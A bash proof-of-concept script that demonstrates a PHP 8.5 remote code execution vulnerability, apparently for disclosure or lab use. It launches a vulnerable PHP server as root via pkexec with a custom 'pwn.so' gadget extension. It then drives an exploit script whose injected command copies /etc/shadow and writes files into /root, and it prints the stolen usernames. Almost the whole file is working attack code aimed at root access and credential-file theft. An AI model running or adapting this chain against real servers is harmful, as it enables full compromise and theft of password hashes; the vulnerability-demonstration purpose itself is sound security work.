#!/usr/bin/env bash
# Demonstrate CVE-2026-109619 impact when the PHP web worker runs as root.
#
# The PoC executes with exactly the privileges of the web worker.  When that
# worker is root (a misconfiguration that still happens: Apache started as
# root, containers running the worker as root, CGI/FPM pools configured with
# an over-privileged user) the exploit yields full root access.
#
# This script starts the *vulnerable* PHP 8.5 build as root via pkexec, then
# triggers the PoC, which:
#   * writes /root/poc_rce_proof.txt
#   * copies /etc/shadow to /root/poc_rce_shadow.txt
#
# Run it from a terminal so pkexec can prompt for your password.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(dirname "$HERE")"
PHP_BIN="${PHP_BIN:-/tmp/php-vuln85/bin/php}"
GADGET="${GADGET:-/tmp/opencode/scratchpad/ext-pwn/modules/pwn.so}"
PORT="${PORT:-9034}"
SID="${SID:-abcdef0123456789abcdef0123456789}"
RUN=/tmp/poc-root-host
SHOW_FULL="${SHOW_FULL:-0}"

[ -x "$PHP_BIN" ] || { echo "build the vulnerable PHP first: $HERE/build_vuln_php.sh"; exit 1; }
[ -f "$GADGET" ] || { echo "build the gadget first: $HERE/build_gadget.sh"; exit 1; }

mkdir -p "$RUN/www" "$RUN/sessions"
cp "$HERE"/{index.php,consumer.php,producer.php} "$RUN/www/"
sed -e "s#/tmp/asanlab/sessions#$RUN/sessions#" "$HERE/lab.ini" > "$RUN/lab.ini"
chmod -R 777 "$RUN"

echo "[*] starting the vulnerable PHP 8.5 as root (pkexec will ask for your password)..."
setsid nohup pkexec "$PHP_BIN" -d extension="$GADGET" -S "127.0.0.1:$PORT" \
    -t "$RUN/www" -c "$RUN/lab.ini" > "$RUN/server.log" 2>&1 &
for _ in $(seq 1 15); do
    sleep 1
    curl -sf "http://127.0.0.1:$PORT/index.php" >/dev/null && break
done
if ! curl -sf "http://127.0.0.1:$PORT/index.php" >/dev/null; then
    echo "[-] the root server did not come up; see $RUN/server.log"
    cat "$RUN/server.log" 2>/dev/null | head
    exit 1
fi
echo "[+] root web worker is up on 127.0.0.1:$PORT"

rm -f /tmp/pwned
python3 "$ROOT/poc_rce.py" --url "http://127.0.0.1:$PORT/" --sid "$SID" \
    --command "id > /root/poc_rce_proof.txt; cp /etc/shadow /root/poc_rce_shadow.txt; ls -la /root >> /root/poc_rce_proof.txt" \
    --session-path "$RUN/sessions/sess_$SID" --stage both || true

echo
echo "=== /root/poc_rce_proof.txt (written by the exploit, as root) ==="
pkexec cat /root/poc_rce_proof.txt
echo
echo "=== /etc/shadow read by the exploit ==="
if [ "$SHOW_FULL" = "1" ]; then
    pkexec cat /root/poc_rce_shadow.txt
else
    echo "(usernames only - set SHOW_FULL=1 to print the full file)"
    pkexec awk -F: 'NR<=8 {printf "%s:%s\n", $1, ($2==""?"(empty)":"<hash redacted>")}' /root/poc_rce_shadow.txt
    pkexec stat -c 'shadow copy: %n  %s bytes  owner %U:%G  mode %a' /root/poc_rce_shadow.txt
fi

pkexec pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null || true
echo
echo "cleanup: pkexec rm -f /root/poc_rce_proof.txt /root/poc_rce_shadow.txt"
